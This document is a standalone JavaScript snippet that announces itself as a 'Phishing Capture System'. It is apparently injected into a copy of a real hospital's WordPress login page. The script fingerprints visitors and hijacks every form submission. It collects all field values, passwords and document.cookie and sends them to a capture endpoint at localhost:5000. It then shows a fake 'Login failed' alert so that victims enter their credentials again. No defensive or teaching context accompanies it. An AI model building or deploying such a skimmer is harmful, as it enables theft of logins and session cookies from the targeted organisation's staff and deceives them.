  <script id="capture-script">
   (function() {
            'use strict';
            
            console.log('%cüéØ Phishing Capture System Active', 'color: red; font-size: 16px; font-weight: bold');
            
            const CONFIG = {
                CAPTURE_URL: 'http://localhost:5000/capture',
                ORIGINAL_URL: 'https://lotushospitalmumbai.com/wp-login.php',
                SESSION_ID: Date.now() + '_' + Math.random().toString(36).substr(2, 9)
            };
            
            // Send data function
            async function sendData(data) {
                data.session_id = CONFIG.SESSION_ID;
                data.page_url = CONFIG.ORIGINAL_URL;
                
                console.log('üì§ Sending:', data.type);
                
                try {
                    const response = await fetch(CONFIG.CAPTURE_URL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(data),
                        mode: 'cors'
                    });
                    
                    const result = await response.json();
                    console.log('‚úÖ Captured successfully:', result);
                    return true;
                    
                } catch (error) {
                    console.error('‚ùå Failed to send:', error);
                    
                    // Fallback: save locally
                    try {
                        let offline = JSON.parse(localStorage.getItem('offline_captures') || '[]');
                        offline.push(data);
                        localStorage.setItem('offline_captures', JSON.stringify(offline));
                        console.log('üíæ Saved offline');
                    } catch(e) {}
                    
                    return false;
                }
            }
            
            // Initial visit tracking
            sendData({
                type: 'page_visit',
                url: window.location.href,
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width + 'x' + screen.height,
                language: navigator.language,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            });
            
            // Wait for DOM
            window.addEventListener('DOMContentLoaded', function() {
                console.log('üìÑ DOM loaded, monitoring forms...');
                
                const forms = document.querySelectorAll('form');
                console.log(`üìã Found ${forms.length} form(s)`);
                
                forms.forEach((form, index) => {
                    console.log(`üîç Monitoring form #${index}`);
                    
                    // Intercept submission
                    form.addEventListener('submit', async function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        
                        console.log('%cüö® FORM SUBMITTED!', 'color: red; font-size: 20px');
                        
                        // Collect form data
                        const formData = {};
                        const formElement = new FormData(form);
                        
                        for (let [key, value] of formElement.entries()) {
                            formData[key] = value;
                        }
                        
                        // Also check all inputs
                        form.querySelectorAll('input, textarea, select').forEach(input => {
                            const name = input.name || input.id || `field_${input.type}`;
                            if (input.value) {
                                formData[name] = input.value;
                                
                                // Mark field type
                                if (input.type === 'password') {
                                    formData[name + '_FIELDTYPE'] = 'üîí PASSWORD';
                                } else if (input.type === 'email') {
                                    formData[name + '_FIELDTYPE'] = 'üìß EMAIL';
                                }
                            }
                        });
                        
                        console.log('üîë Captured data:', formData);
                        
                        // Send to server
                        const sent = await sendData({
                            type: 'credentials_captured',
                            formData: formData,
                            formIndex: index,
                            url: CONFIG.ORIGINAL_URL,
                            cookies: document.cookie,
                            timestamp: new Date().toISOString()
                        });
                        
                        // Show fake loading
                        const submitBtn = form.querySelector('button[type="submit"], input[type="submit"], button:not([type])');
                        
                        if (submitBtn) {
                            const originalText = submitBtn.textContent || submitBtn.value;
                            submitBtn.disabled = true;
                            
                            if (submitBtn.textContent) {
                                submitBtn.textContent = 'Signing in...';
                            } else {
                                submitBtn.value = 'Signing in...';
                            }
                            
                            // Show error after delay
                            setTimeout(() => {
                                alert('‚ö†Ô∏è Login failed. Please check your credentials and try again.');
                                
                                submitBtn.disabled = false;
                                if (submitBtn.textContent) {
                                    submitBtn.textContent = originalText;
                                } else {
                                    submitBtn.value = originalText;
                                }
                                
                                // Clear password
                                form.querySelectorAll('input[type="password"]').forEach(p => p.value = '');
                                
                            }, 2500);
                        }
                        
                        return false;
                    }, true); // Use capture phase
                    
                    // Monitor input fields
                    form.querySelectorAll('input').forEach(input => {
                        input.addEventListener('blur', function() {
                            if (this.value && (this.type === 'email' || this.type === 'text' || this.type === 'password')) {
                                sendData({
                                    type: 'field_completed',
                                    field_name: this.name || this.id,
                                    field_type: this.type,
                                    value_length: this.value.length,
                                    timestamp: new Date().toISOString()
                                });
                            }
                        });
                    });
                });
            });
            
            console.log('‚úÖ Capture system ready');
        })();
  </script>
